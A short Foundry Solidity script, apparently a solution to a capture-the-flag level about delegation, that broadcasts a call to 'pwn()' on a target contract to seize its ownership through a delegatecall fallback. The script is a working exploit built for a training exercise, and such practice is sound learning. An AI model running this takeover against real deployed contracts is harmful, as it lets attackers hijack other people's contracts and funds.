// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

contract DelegateSolution is Script {
    error Delegate_CallFailed();

    function run(address target) public {
        bytes memory data = abi.encodeWithSignature("pwn()");
        vm.startBroadcast();
        (bool success,) = target.call(data);
        vm.stopBroadcast();
        if (!success) {
            revert Delegate_CallFailed();
        }
    }
}
